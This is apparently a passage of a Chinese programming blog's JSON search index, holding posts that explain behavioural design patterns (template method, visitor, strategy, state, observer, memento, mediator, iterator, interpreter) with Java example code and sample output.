Pattern）中，一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。 介绍意图：定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。 主要解决：一些方法通用，却在每一个子类都重新写了这一方法。 何时使用：有一些通用的方法。 如何解决：将这些通用算法抽象出来。 关键代码：在抽象类实现，其他步骤在子类实现。 应用实例： 1、在造房子的时候，地基、走线、水管都一样，只有在建筑的后期才有加壁橱加栅栏等差异。 2、西游记里面菩萨定好的 81 难，这就是一个顶层的逻辑骨架。 3、spring 中对 Hibernate 的支持，将一些已经定好的方法封装起来，比如开启事务、获取 Session、关闭 Session 等，程序员不重复写那些已经规范好的代码，直接丢一个实体就可以保存。 优点： 1、封装不变部分，扩展可变部分。 2、提取公共代码，便于维护。 3、行为由父类控制，子类实现。 缺点：每一个不同的实现都需要一个子类来实现，导致类的个数增加，使得系统更加庞大。 使用场景： 1、有多个子类共有的方法，且逻辑相同。 2、重要的、复杂的方法，可以考虑作为模板方法。 注意事项：为防止恶意操作，一般模板方法都加上 final 关键词。 实现我们将创建一个定义操作的 Game 抽象类，其中，模板方法设置为 final，这样它就不会被重写。Cricket 和 Football 是扩展了 Game 的实体类，它们重写了抽象类的方法。 TemplatePatternDemo，我们的演示类使用 Game 来演示模板模式的用法。 步骤1创建一个抽象类，它的模板方法被设置为 final。 Game.java 123456789101112131415161718public abstract class Game &#123; abstract void initialize(); abstract void startPlay(); abstract void endPlay(); //模板 public final void play()&#123; //初始化游戏 initialize(); //开始游戏 startPlay(); //结束游戏 endPlay(); &#125;&#125; 步骤 2创建扩展了上述类的实体类。 Cricket.java 1234567891011121314151617public class Cricket extends Game &#123; @Override void endPlay() &#123; System.out.println(\"Cricket Game Finished!\"); &#125; @Override void initialize() &#123; System.out.println(\"Cricket Game Initialized! Start playing.\"); &#125; @Override void startPlay() &#123; System.out.println(\"Cricket Game Started. Enjoy the game!\"); &#125;&#125; Football.java 1234567891011121314151617public class Football extends Game &#123; @Override void endPlay() &#123; System.out.println(\"Football Game Finished!\"); &#125; @Override void initialize() &#123; System.out.println(\"Football Game Initialized! Start playing.\"); &#125; @Override void startPlay() &#123; System.out.println(\"Football Game Started. Enjoy the game!\"); &#125;&#125; 步骤 3使用 Game 的模板方法 play() 来演示游戏的定义方式。 TemplatePatternDemo.java 12345678910public class TemplatePatternDemo &#123; public static void main(String[] args) &#123; Game game = new Cricket(); game.play(); System.out.println(); game = new Football(); game.play(); &#125;&#125; 步骤 4执行程序，输出结果： 1234567Cricket Game Initialized! Start playing.Cricket Game Started. Enjoy the game!Cricket Game Finished!Football Game Initialized! Start playing.Football Game Started. Enjoy the game!Football Game Finished!","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"访问者模式","slug":"访问者模式","date":"2020-06-13T01:22:33.000Z","updated":"2021-04-11T17:11:29.045Z","comments":true,"path":"visitor-mode/","link":"","permalink":"https://kayleh.top/visitor-mode/","excerpt":"访问者 表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。","text":"访问者 表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。 访问者模式在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。 介绍意图：主要将数据结构与数据操作分离。 主要解决：稳定的数据结构和易变的操作耦合问题。 何时使用：需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，使用访问者模式将这些封装到类中。 如何解决：在被访问的类里面加一个对外提供接待访问者的接口。 关键代码：在数据基础类里面有一个方法接受访问者，将自身引用传入访问者。 应用实例：您在朋友家做客，您是访问者，朋友接受您的访问，您通过朋友的描述，然后对朋友的描述做出一个判断，这就是访问者模式。 优点： 1、符合单一职责原则。 2、优秀的扩展性。 3、灵活性。 缺点： 1、具体元素对访问者公布细节，违反了迪米特原则。 2、具体元素变更比较困难。 3、违反了依赖倒置原则，依赖了具体类，没有依赖抽象。 使用场景： 1、对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。 2、需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，也不希望在增加新操作时修改这些类。 注意事项：访问者可以对功能进行统一，可以做报表、UI、拦截器与过滤器。 实现我们将创建一个定义接受操作的 ComputerPart 接口。Keyboard、Mouse、Monitor 和 Computer 是实现了 ComputerPart 接口的实体类。我们将定义另一个接口 ComputerPartVisitor，它定义了访问者类的操作。Computer 使用实体访问者来执行相应的动作。 VisitorPatternDemo，我们的演示类使用 Computer、ComputerPartVisitor 类来演示访问者模式的用法。 步骤 1定义一个表示元素的接口。 ComputerPart.java 123public interface ComputerPart &#123; public void accept(ComputerPartVisitor computerPartVisitor);&#125; 步骤 2创建扩展了上述类的实体类。 Keyboard.java 1234567public class Keyboard implements ComputerPart &#123; @Override public void accept(ComputerPartVisitor computerPartVisitor) &#123; computerPartVisitor.visit(this); &#125;&#125; Monitor.java 1234567public class Monitor implements ComputerPart &#123; @Override public void accept(ComputerPartVisitor computerPartVisitor) &#123; computerPartVisitor.visit(this); &#125;&#125; Mouse.java 1234567public class Mouse implements ComputerPart &#123; @Override public void accept(ComputerPartVisitor computerPartVisitor) &#123; computerPartVisitor.visit(this); &#125;&#125; Computer.java 1234567891011121314151617public class Computer implements ComputerPart &#123; ComputerPart[] parts; public Computer()&#123; parts = new ComputerPart[] &#123;new Mouse(), new Keyboard(), new Monitor()&#125;; &#125; @Override public void accept(ComputerPartVisitor computerPartVisitor) &#123; for (int i = 0; i &lt; parts.length; i++) &#123; parts[i].accept(computerPartVisitor); &#125; computerPartVisitor.visit(this); &#125;&#125; 步骤 3定义一个表示访问者的接口。 ComputerPartVisitor.java 123456public interface ComputerPartVisitor &#123; public void visit(Computer computer); public void visit(Mouse mouse); public void visit(Keyboard keyboard); public void visit(Monitor monitor);&#125; 步骤 4创建实现了上述类的实体访问者。 ComputerPartDisplayVisitor.java 12345678910111213141516171819202122public class ComputerPartDisplayVisitor implements ComputerPartVisitor &#123; @Override public void visit(Computer computer) &#123; System.out.println(\"Displaying Computer.\"); &#125; @Override public void visit(Mouse mouse) &#123; System.out.println(\"Displaying Mouse.\"); &#125; @Override public void visit(Keyboard keyboard) &#123; System.out.println(\"Displaying Keyboard.\"); &#125; @Override public void visit(Monitor monitor) &#123; System.out.println(\"Displaying Monitor.\"); &#125;&#125; 步骤 5使用 ComputerPartDisplayVisitor 来显示 Computer 的组成部分。 VisitorPatternDemo.java 1234567public class VisitorPatternDemo &#123; public static void main(String[] args) &#123; ComputerPart computer = new Computer(); computer.accept(new ComputerPartDisplayVisitor()); &#125;&#125; 步骤 6执行程序，输出结果： 1234Displaying Mouse.Displaying Keyboard.Displaying Monitor.Displaying Computer.","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"策略模式","slug":"策略模式","date":"2020-06-13T01:17:47.000Z","updated":"2021-04-11T17:11:28.979Z","comments":true,"path":"strategy-mode/","link":"","permalink":"https://kayleh.top/strategy-mode/","excerpt":"策略 定义一系列的算法，把它们一个个封装起来，并且使它们可相互替换。本模式使得算法可独立于使用它的客户而变化。","text":"策略 定义一系列的算法，把它们一个个封装起来，并且使它们可相互替换。本模式使得算法可独立于使用它的客户而变化。 策略模式：Strategy，是指，定义一组算法，并把其封装到一个对象中。然后在运行时，可以灵活的使用其中的一个算法。 策略模式在Java标准库中应用非常广泛，我们以排序为例，看看如何通过Arrays.sort()实现忽略大小写排序： 12345678import java.util.Arrays; `public class Main &#123; public static void main(String[] args) throws InterruptedException &#123; String[] array = &#123; \"apple\", \"Pear\", \"Banana\", \"orange\" &#125;; Arrays.sort(array, String::compareToIgnoreCase); System.out.println(Arrays.toString(array)); &#125;&#125; 如果我们想忽略大小写排序，就传入String::compareToIgnoreCase，如果我们想倒序排序，就传入(s1, s2) -&gt; -s1.compareTo(s2)，这个比较两个元素大小的算法就是策略。 我们观察Arrays.sort(T[] a, Comparator c)这个排序方法，它在内部实现了TimSort排序，但是，排序算法在比较两个元素大小的时候，需要借助我们传入的Comparator对象，才能完成比较。因此，这里的策略是指比较两个元素大小的策略，可以是忽略大小写比较，可以是倒序比较，也可以根据字符串长度比较。 因此，上述排序使用到了策略模式，它实际上指，在一个方法中，流程是确定的，但是，某些关键步骤的算法依赖调用方传入的策略，这样，传入不同的策略，即可获得不同的结果，大大增强了系统的灵活性。 如果我们自己实现策略模式的排序，用冒泡法编写如下： 12345678910111213141516171819public class Main &#123; public static void main(String[] args) throws InterruptedException &#123; String[] array = &#123; \"apple\", \"Pear\", \"Banana\", \"orange\" &#125;; sort(array, String::compareToIgnoreCase); System.out.println(Arrays.toString(array)); &#125; static &lt;T&gt; void sort(T[] a, Comparator&lt;? super T&gt; c) &#123; for (int i = 0; i &lt; a.length - 1; i++) &#123; for (int j = 0; j &lt; a.length - 1 - i; j++) &#123; if (c.compare(a[j], a[j + 1]) &gt; 0) &#123; // 注意这里比较两个元素的大小依赖传入的策略 T temp = a[j]; a[j] = a[j + 1]; a[j + 1] = temp; &#125; &#125; &#125; &#125;&#125; 一个完整的策略模式要定义策略以及使用策略的上下文。我们以购物车结算为例，假设网站针对普通会员、Prime会员有不同的折扣，同时活动期间还有一个满100减20的活动，这些就可以作为策略实现。先定义打折策略接口： 1234public interface DiscountStrategy &#123; // 计算折扣额度: BigDecimal getDiscount(BigDecimal total);&#125; 接下来，就是实现各种策略。普通用户策略如下： 123456public class UserDiscountStrategy implements DiscountStrategy &#123; public BigDecimal getDiscount(BigDecimal total) &#123; // 普通会员打九折: return total.multiply(new BigDecimal(\"0.1\")).setScale(2, RoundingMode.DOWN); &#125;&#125; 满减策略如下： 123456public class OverDiscountStrategy implements DiscountStrategy &#123; public BigDecimal getDiscount(BigDecimal total) &#123; // 满100减20优惠: return total.compareTo(BigDecimal.valueOf(100)) &gt;= 0 ? BigDecimal.valueOf(20) : BigDecimal.ZERO; &#125;&#125; 最后，要应用策略，我们需要一个DiscountContext： 12345678910111213public class DiscountContext &#123; // 持有某个策略: private DiscountStrategy strategy = new UserDiscountStrategy(); // 允许客户端设置新策略: public void setStrategy(DiscountStrategy strategy) &#123; this.strategy = strategy; &#125; public BigDecimal calculatePrice(BigDecimal total) &#123; return total.subtract(this.strategy.getDiscount(total)).setScale(2); &#125;&#125; 调用方必须首先创建一个DiscountContext，并指定一个策略（或者使用默认策略），即可获得折扣后的价格： 123456789101112131415DiscountContext ctx = new DiscountContext();// 默认使用普通会员折扣:BigDecimal pay1 = ctx.calculatePrice(BigDecimal.valueOf(105));System.out.println(pay1);// 使用满减折扣:ctx.setStrategy(new OverDiscountStrategy());BigDecimal pay2 = ctx.calculatePrice(BigDecimal.valueOf(105));System.out.println(pay2);// 使用Prime会员折扣:ctx.setStrategy(new PrimeDiscountStrategy());BigDecimal pay3 = ctx.calculatePrice(BigDecimal.valueOf(105));System.out.println(pay3); 上述完整的策略模式如下图所示： 12345678910111213┌───────────────┐ ┌─────────────────┐│DiscountContext│─ ─ ─&gt;│DiscountStrategy │└───────────────┘ └─────────────────┘ ▲ │ ┌─────────────────────┐ ├─│UserDiscountStrategy │ │ └─────────────────────┘ │ ┌─────────────────────┐ ├─│PrimeDiscountStrategy│ │ └─────────────────────┘ │ ┌─────────────────────┐ └─│OverDiscountStrategy │ └─────────────────────┘ 策略模式的核心思想是在一个计算方法中把容易变化的算法抽出来作为“策略”参数传进去，从而使得新增策略不必修改原有逻辑。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"状态模式","slug":"状态模式","date":"2020-06-13T00:14:10.000Z","updated":"2021-04-11T17:11:28.971Z","comments":true,"path":"state-mode/","link":"","permalink":"https://kayleh.top/state-mode/","excerpt":"状态 允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。","text":"状态 允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。 状态模式（State）经常用在带有状态的对象中。 什么是状态？我们以QQ聊天为例，一个用户的QQ有几种状态： 离线状态（尚未登录）； 正在登录状态； 在线状态； 忙状态（暂时离开）。 如何表示状态？我们定义一个enum就可以表示不同的状态。但不同的状态需要对应不同的行为，比如收到消息时： 12345if (state == ONLINE) &#123; // 闪烁图标&#125; else if (state == BUSY) &#123; reply(\"现在忙，稍后回复\");&#125; else if ... 状态模式的目的是为了把上述一大串if...else...的逻辑给分拆到不同的状态类中，使得将来增加状态比较容易。 例如，我们设计一个聊天机器人，它有两个状态： 未连线； 已连线。 对于未连线状态，我们收到消息也不回复： 123456789public class DisconnectedState implements State &#123; public String init() &#123; return \"Bye!\"; &#125; public String reply(String input) &#123; return \"\"; &#125;&#125; 对于已连线状态，我们回应收到的消息： 123456789101112131415public class ConnectedState implements State &#123; public String init() &#123; return \"Hello, I'm Bob.\"; &#125; public String reply(String input) &#123; if (input.endsWith(\"?\")) &#123; return \"Yes. \" + input.substring(0, input.length() - 1) + \"!\"; &#125; if (input.endsWith(\".\")) &#123; return input.substring(0, input.length() - 1) + \"!\"; &#125; return input.substring(0, input.length() - 1) + \"?\"; &#125;&#125; 状态模式的关键设计思想在于状态切换，我们引入一个BotContext完成状态切换： 12345678910111213141516public class BotContext &#123; private State state = new DisconnectedState(); public String chat(String input) &#123; if (\"hello\".equalsIgnoreCase(input)) &#123; // 收到hello切换到在线状态: state = new ConnectedState(); return state.init(); &#125; else if (\"bye\".equalsIgnoreCase(input)) &#123; / 收到bye切换到离线状态: state = new DisconnectedState(); return state.init(); &#125; return state.reply(input); &#125;&#125; 这样，一个价值千万的AI聊天机器人就诞生了： 12345678Scanner scanner = new Scanner(System.in);BotContext bot = new BotContext();for (;;) &#123; System.out.print(\"&gt; \"); String input = scanner.nextLine(); String output = bot.chat(input); System.out.println(output.isEmpty() ? \"(no reply)\" : \"&lt; \" + output);&#125; 试试效果： 12345678&gt; hello&lt; Hello, I'm Bob.&gt; Nice to meet you.&lt; Nice to meet you!&gt; Today is cold?&lt; Yes. Today is cold!&gt; bye&lt; Bye!","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"观察者模式","slug":"观察者模式","date":"2020-06-13T00:07:09.000Z","updated":"2021-04-11T17:11:29.014Z","comments":true,"path":"observer-mode/","link":"","permalink":"https://kayleh.top/observer-mode/","excerpt":"观察者 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。","text":"观察者 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。 观察者模式（Observer）又称发布-订阅模式（Publish-Subscribe：Pub/Sub）。它是一种通知机制，让发送通知的一方（被观察方）和接收通知的一方（观察者）能彼此分离，互不影响。 要理解观察者模式，我们还是看例子。 假设一个电商网站，有多种Product（商品），同时，Customer（消费者）和Admin（管理员）对商品上架、价格改变都感兴趣，希望能第一时间获得通知。于是，Store（商场）可以这么写： 123456789101112131415161718192021222324public class Store &#123; Customer customer; Admin admin; private Map&lt;String, Product&gt; products = new HashMap&lt;&gt;(); public void addNewProduct(String name, double price) &#123; Product p = new Product(name, price); products.put(p.getName(), p); // 通知用户: customer.onPublished(p); // 通知管理员: admin.onPublished(p); &#125; public void setProductPrice(String name, double price) &#123; Product p = products.get(name); p.setPrice(price); // 通知用户: customer.onPriceChanged(p); // 通知管理员: admin.onPriceChanged(p); &#125;&#125; 我们观察上述Store类的问题：它直接引用了Customer和Admin。先不考虑多个Customer或多个Admin的问题，上述Store类最大的问题是，如果要加一个新的观察者类型，例如工商局管理员，Store类就必须继续改动。 因此，上述问题的本质是Store希望发送通知给那些关心Product的对象，但Store并不想知道这些人是谁。观察者模式就是要分离被观察者和观察者之间的耦合关系。 要实现这一目标也很简单，Store不能直接引用Customer和Admin，相反，它引用一个ProductObserver接口，任何人想要观察Store，只要实现该接口，并且把自己注册到Store即可： 12345678910111213141516171819202122232425262728public class Store &#123; private List&lt;ProductObserver&gt; observers = new ArrayList&lt;&gt;(); private Map&lt;String, Product&gt; products = new HashMap&lt;&gt;(); // 注册观察者: public void addObserver(ProductObserver observer) &#123; this.observers.add(observer); &#125; // 取消注册: public void removeObserver(ProductObserver observer) &#123; this.observers.remove(observer); &#125; public void addNewProduct(String name, double price) &#123; Product p = new Product(name, price); products.put(p.getName(), p); // 通知观察者: observers.forEach(o -&gt; o.onPublished(p)); &#125; public void setProductPrice(String name, double price) &#123; Product p = products.get(name); p.setPrice(price); // 通知观察者: observers.forEach(o -&gt; o.onPriceChanged(p)); &#125;&#125; 就是这么一个小小的改动，使得观察者类型就可以无限扩充，而且，观察者的定义可以放到客户端： 12345678// observer:Admin a = new Admin();Customer c = new Customer();// store:Store store = new Store();// 注册观察者:store.addObserver(a);store.addObserver(c); 甚至可以注册匿名观察者： 123456789store.addObserver(new ProductObserver() &#123; public void onPublished(Product product) &#123; System.out.println(\"[Log] on product published: \" + product); &#125; public void onPriceChanged(Product product) &#123; System.out.println(\"[Log] on product price changed: \" + product); &#125;&#125;); 用一张图画出观察者模式： 12345678910┌─────────┐ ┌───────────────┐│ Store │─ ─ ─&gt;│ProductObserver│└─────────┘ └───────────────┘ │ ▲ │ │ ┌─────┴─────┐ ▼ │ │┌─────────┐ ┌─────────┐ ┌─────────┐│ Product │ │ Admin │ │Customer │ ...└─────────┘ └─────────┘ └─────────┘ 观察者模式也有很多变体形式。有的观察者模式把被观察者也抽象出接口： 1234public interface ProductObservable &#123; // 注意此处拼写是Observable不是Observer! void addObserver(ProductObserver observer); void removeObserver(ProductObserver observer);&#125; 对应的实体被观察者就要实现该接口： 123public class Store implements ProductObservable &#123; ...&#125; 有些观察者模式把通知变成一个Event对象，从而不再有多种方法通知，而是统一成一种： 123public interface ProductObserver &#123; void onEvent(ProductEvent event);&#125; 让观察者自己从Event对象中读取通知类型和通知数据。 广义的观察者模式包括所有消息系统。所谓消息系统，就是把观察者和被观察者完全分离，通过消息系统本身来通知： 12345678910111213 ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐ Messaging System │ │ ┌──────────────────┐ ┌──┼&gt;│Topic:newProduct │──┼─┐ ┌─────────┐ │ └──────────────────┘ ├───&gt;│ConsumerA│┌─────────┐ │ │ ┌──────────────────┐ │ │ └─────────┘│Producer │───┼───&gt;│Topic:priceChanged│────┘└─────────┘ │ │ └──────────────────┘ │ │ ┌──────────────────┐ ┌─────────┐ └──┼&gt;│Topic:soldOut │──┼─────&gt;│ConsumerB│ └──────────────────┘ └─────────┘ └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘ 消息发送方称为Producer，消息接收方称为Consumer，Producer发送消息的时候，必须选择发送到哪个Topic。Consumer可以订阅自己感兴趣的Topic，从而只获得特定类型的消息。 使用消息系统实现观察者模式时，Producer和Consumer甚至经常不在同一台机器上，并且双方对对方完全一无所知，因为注册观察者这个动作本身都在消息系统中完成，而不是在Producer内部完成。 此外，注意到我们在编写观察者模式的时候，通知Observer是依靠语句： 1observers.forEach(o -&gt; o.onPublished(p)); 这说明各个观察者是依次获得的同步通知，如果上一个观察者处理太慢，会导致下一个观察者不能及时获得通知。此外，如果观察者在处理通知的时候，发生了异常，还需要被观察者处理异常，才能保证继续通知下一个观察者。 思考：如何改成异步通知，使得所有观察者可以并发同时处理？ 有的童鞋可能发现Java标准库有个java.util.Observable类和一个Observer接口，用来帮助我们实现观察者模式。但是，这个类非常不！好！用！实现观察者模式的时候，也不推荐借助这两个东东。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"memo-mode","slug":"备忘录模式","date":"2020-06-12T23:20:47.000Z","updated":"2021-04-11T17:11:28.831Z","comments":true,"path":"memo-mode/","link":"","permalink":"https://kayleh.top/memo-mode/","excerpt":"备忘录模式 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。","text":"备忘录模式 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。 备忘录模式（Memento），主要用于捕获一个对象的内部状态，以便在将来的某个时候恢复此状态。 其实我们使用的几乎所有软件都用到了备忘录模式。最简单的备忘录模式就是保存到文件，打开文件。对于文本编辑器来说，保存就是把TextEditor类的字符串存储到文件，打开就是恢复TextEditor类的状态。对于图像编辑器来说，原理是一样的，只是保存和恢复的数据格式比较复杂而已。Java的序列化也可以看作是备忘录模式。 在使用文本编辑器的时候，我们还经常使用Undo、Redo这些功能。这些其实也可以用备忘录模式实现，即不定期地把TextEditor类的字符串复制一份存起来，这样就可以Undo或Redo。 标准的备忘录模式有这么几种角色： Memonto：存储的内部状态； Originator：创建一个备忘录并设置其状态； Caretaker：负责保存备忘录。 实际上我们在使用备忘录模式的时候，不必设计得这么复杂，只需要对类似TextEditor的类，增加getState()和setState()就可以了。 我们以一个文本编辑器TextEditor为例，它内部使用StringBuilder允许用户增删字符： 1234567891011121314151617public class TextEditor &#123; private StringBuilder buffer = new StringBuilder(); public void add(char ch) &#123; buffer.append(ch); &#125; public void add(String s) &#123; buffer.append(s); &#125; public void delete() &#123; if (buffer.length() &gt; 0) &#123; buffer.deleteCharAt(buffer.length() - 1); &#125; &#125;&#125; 为了支持这个TextEditor能保存和恢复状态，我们增加getState()和setState()两个方法： 1234567891011121314public class TextEditor &#123; ... // 获取状态: public String getState() &#123; return buffer.toString(); &#125; // 恢复状态: public void setState(String state) &#123; this.buffer.delete(0, this.buffer.length()); this.buffer.append(state); &#125;&#125; 对这个简单的文本编辑器，用一个String就可以表示其状态，对于复杂的对象模型，通常我们会使用JSON、XML等复杂格式。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"中介者模式","slug":"中介者模式","date":"2020-06-12T22:46:55.000Z","updated":"2021-04-11T17:11:28.556Z","comments":true,"path":"intermediary-model/","link":"","permalink":"https://kayleh.top/intermediary-model/","excerpt":"中介者模式 中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。","text":"中介者模式 中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。 介绍意图：用一个中介对象来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。 主要解决：对象与对象之间存在大量的关联关系，这样势必会导致系统的结构变得很复杂，同时若一个对象发生改变，我们也需要跟踪与之相关联的对象，同时做出相应的处理。 何时使用：多个类相互耦合，形成了网状结构。 如何解决：将上述网状结构分离为星型结构。 关键代码：对象 Colleague 之间的通信封装到一个类中单独处理。 应用实例： 1、中国加入 WTO 之前是各个国家相互贸易，结构复杂，现在是各个国家通过 WTO 来互相贸易。 2、机场调度系统。 3、MVC 框架，其中C（控制器）就是 M（模型）和 V（视图）的中介者。 优点： 1、降低了类的复杂度，将一对多转化成了一对一。 2、各个类之间的解耦。 3、符合迪米特原则。 缺点：中介者会庞大，变得复杂难以维护。 使用场景： 1、系统中对象之间存在比较复杂的引用关系，导致它们之间的依赖关系结构混乱而且难以复用该对象。 2、想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。 注意事项：不应当在职责混乱的时候使用。 实现我们通过聊天室实例来演示中介者模式。实例中，多个用户可以向聊天室发送消息，聊天室向所有的用户显示消息。我们将创建两个类 ChatRoom 和 User。User 对象使用 ChatRoom 方法来分享他们的消息。 MediatorPatternDemo，我们的演示类使用 User 对象来显示他们之间的通信。 步骤 1创建中介类。 ChatRoom.java 步骤 2创建 user 类。 User.java 步骤 3使用 User 对象来显示他们之间的通信。 MediatorPatternDemo.java 步骤 4执行程序，输出结果： 12Thu Jan 31 16:05:46 IST 2013 [Robert] : Hi! John!Thu Jan 31 16:05:46 IST 2013 [John] : Hello! Robert!","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"迭代器模式","slug":"迭代器模式","date":"2020-06-12T21:26:48.000Z","updated":"2021-04-11T17:11:29.064Z","comments":true,"path":"iterator-mode/","link":"","permalink":"https://kayleh.top/iterator-mode/","excerpt":"迭代器 提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。","text":"迭代器 提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。 迭代器模式（Iterator）实际上在Java的集合类中已经广泛使用了。我们以List为例，要遍历ArrayList，即使我们知道它的内部存储了一个Object[]数组，也不应该直接使用数组索引去遍历，因为这样需要了解集合内部的存储结构。如果使用Iterator遍历，那么，ArrayList和LinkedList都可以以一种统一的接口来遍历： 1234List&lt;String&gt; list = ...for (Iterator&lt;String&gt; it = list.iterator(); it.hasNext(); ) &#123; String s = it.next();&#125; 实际上，因为Iterator模式十分有用，因此，Java允许我们直接把任何支持Iterator的集合对象用foreach循环写出来： 1234List&lt;String&gt; list = ...for (String s : list) &#123;&#125; 然后由Java编译器完成Iterator模式的所有循环代码。 虽然我们对如何使用Iterator有了一定了解，但如何实现一个Iterator模式呢？我们以一个自定义的集合为例，通过Iterator模式实现倒序遍历： 123456789101112public class ReverseArrayCollection&lt;T&gt; implements Iterable&lt;T&gt; &#123; // 以数组形式持有集合: private T[] array; public ReverseArrayCollection(T... objs) &#123; this.array = Arrays.copyOfRange(objs, 0, objs.length); &#125; public Iterator&lt;T&gt; iterator() &#123; return ???; &#125;&#125; 实现Iterator模式的关键是返回一个Iterator对象，该对象知道集合的内部结构，因为它可以实现倒序遍历。我们使用Java的内部类实现这个Iterator： 1234567891011121314151617181920212223242526272829303132public class ReverseArrayCollection&lt;T&gt; implements Iterable&lt;T&gt; &#123; private T[] array; public ReverseArrayCollection(T... objs) &#123; this.array = Arrays.copyOfRange(objs, 0, objs.length); &#125; public Iterator&lt;T&gt; iterator() &#123; return new ReverseIterator(); &#125; class ReverseIterator implements Iterator&lt;T&gt; &#123; // 索引位置: int index; public ReverseIterator() &#123; // 创建Iterator时,索引在数组末尾: this.index = ReverseArrayCollection.this.array.length; &#125; public boolean hasNext() &#123; // 如果索引大于0,那么可以移动到下一个元素(倒序往前移动): return index &gt; 0; &#125; public T next() &#123; // 将索引移动到下一个元素并返回(倒序往前移动): index--; return array[index]; &#125; &#125;&#125; 使用内部类的好处是内部类隐含地持有一个它所在对象的this引用，可以通过ReverseArrayCollection.this引用到它所在的集合。上述代码实现的逻辑非常简单，但是实际应用时，如果考虑到多线程访问，当一个线程正在迭代某个集合，而另一个线程修改了集合的内容时，是否能继续安全地迭代，还是抛出ConcurrentModificationException，就需要更仔细地设计。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"解释器模式","slug":"解释器模式","date":"2020-06-12T05:31:18.000Z","updated":"2021-04-11T17:11:29.018Z","comments":true,"path":"interpreter-mode/","link":"","permalink":"https://kayleh.top/interpreter-mode/","excerpt":"解释器模式 解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。","text":"解释器模式 解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。 介绍意图：给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。 主要解决：对于一些固定文法构建一个解释句子的解释器。 何时使用：如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。 如何解决：构建语法树，定义终结符与非终结符。 关键代码：构建环境类，包含解释器之外的一些全局信息，一般是 HashMap。 应用实例：编译器、运算表达式计算。 优点： 1、可扩展性比较好，灵活。 2、增加了新的解释表达式的方式。 3、易于实现简单文法。 缺点： 1、可利用场景比较少。 2、对于复杂的文法比较难维护。 3、解释器模式会引起类膨胀。 4、解释器模式采用递归调用方法。 使用场景： 1、可以将一个需要解释执行的语言中的句子表示为一个抽象语法树。 2、一些重复出现的问题可以用一种简单的语言来进行表达。 3、一个简单语法需要解释的场景。 注意事项：可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。 实现我们将创建一个接口 Expression 和实现了 Expression 接口的实体类。定义作为上下文中主要解释器的 TerminalExpression 类。其他的类 OrExpression、AndExpression 用于创建组合式表达式。 